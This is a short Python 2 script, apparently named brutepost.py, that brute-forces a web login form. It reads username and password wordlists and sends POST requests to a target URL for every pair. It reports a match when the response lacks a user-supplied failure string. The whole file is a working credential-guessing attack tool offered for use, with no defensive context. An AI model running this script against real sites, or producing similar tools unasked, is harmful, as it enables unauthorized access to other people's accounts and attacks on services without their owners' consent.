#!/usr/bin/python
#ig: @thelinuxchoice

import requests
import sys
if len(sys.argv[1:]) != 1:
   print "Usage: python brutepost.py [target]"
   sys.exit(0)
target = sys.argv[1]
bad_login = raw_input('Bad login word (Press enter to analyze html):')
if len(bad_login) == 0:
   r = requests.post(target, data={'username':'test','password':'test'})
   print r.text
   sys.exit(0)
users = open(raw_input('Users wordlist:'))
wl_pass = raw_input('Passwords wordlist:')
for user in users:
   passwds = open(wl_pass)
   for passwd in passwds:
      user = user.rstrip()
      passwd = passwd.rstrip()
      print('Trying user',user,'and password:',passwd)
      payload = {'username': user, 'password' : passwd}
      r = requests.post(target, data = payload)
      r2 = r.text
      if bad_login not in r2: 
         print('''Found! User: {user} Password: {passwd}'''
         .format(user=user,passwd=passwd))
         sys.exit(0)
